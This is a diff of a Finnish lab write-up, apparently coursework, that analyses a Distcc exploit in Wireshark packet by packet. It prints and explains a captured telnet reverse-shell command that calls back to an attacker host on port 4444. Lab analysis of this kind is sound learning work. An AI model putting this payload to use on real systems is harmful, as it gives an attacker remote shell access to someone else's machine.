@@ -82,7 +82,46 @@ def exploit
 
 Tämän onnistuessa `read_output`-funktio palauttaa kohteen vastauksen komennoille. Lisäksi `dist_cmd`-funktio formatoi annetut komennot muotoon, joka huijaa `Distcc`-työkalun suorittamaan ne.
 
-Lopuksi suoritin vielä hyökkäyksen uudelleen, tällä kertaa pitäen Wiresharkkia päällä toisessa terminaalissa. 
+Lopuksi suoritin vielä hyökkäyksen uudelleen, tällä kertaa pitäen Wiresharkkia päällä toisessa terminaalissa. Yhteys alkaa kolmisuuntaisella TCP kättelyllä (SYN, SYN-ACK, ACK eli paketit 13-15), jonka jälkeen datan siirto voidaan aloittaa.
+
+![image](https://github.com/user-attachments/assets/77e3ab20-ab06-4d7a-9347-34ae436d0477)
+
+_TCP-kättely_
+
+Kättelyä seurasi itse hyökkäyksen syöttäminen DistCC:lle (paketit 16, 18, 28). Näissä paketeissa lukee varoitus `Malformed Packet: DTCC`, joka viittaa siihen, että ne tekevät jotain odottamatonta.
+
+![image](https://github.com/user-attachments/assets/7dec5e8d-09bf-4b96-8939-8718d2660e11)
+
+_Hyökkäyspaketit_
+
+Katsoin pakettia 16 tarkemmin napilla `Follow TCP stream`.
+
+![image](https://github.com/user-attachments/assets/399ad9eb-41a1-441d-8529-8f39f9e52599)
+
+_Paketti 16_
+
+Tästä pystyin nähdä suoraan hyökkäystä suorittavaa koodia;
+
+```
+sh -c '(sleep 3974|telnet 192.168.82.4 4444|while : ; do sh && break; done 2>&1|telnet 192.168.82.4 4444 >/dev/null 2>&1 &)'
+```
+Tämä koodi syöttää kohteessa uudelle komentokehotteelle komennon avata Telnet-yhteys hyökkääjän IP-osoitteseen `192.168.82.4` ja porttiin `4444`. Samalla komento lähettää kohteessa avatun komentokehotteen tulosteet hyökkääjälle, joka mahdollistaa koneen etäkäytön sekä hyökkäyksen onnistumisen todentamisen.
+
+Paketti 18 on varsin samankaltainen, sillä se lähettää antamanne payloadin kohteeseen.
+
+![image](https://github.com/user-attachments/assets/8b1b6c2d-9b1d-4b6a-8c59-7abf2ab7eb79)
+
+_Paketti 18_
+
+Paketti 28 lähettää payloadin vielä `DistCC`-formatissa.
+
+![image](https://github.com/user-attachments/assets/ea703a62-fc2d-45ab-b339-f26ee37e7f4a)
+
+_Paketti 28_
+
+Näiden pakettien välissä paketit 17, 19 ja 29 ovat kohteen antamia vastauksia siitä, että komentojamme on suoritettu. 
+
+Lopuksi paketit 30 ja 33 ilmaisevat Stop-napin painamista Wiresharkissa.
 
 ### Lähteet
 
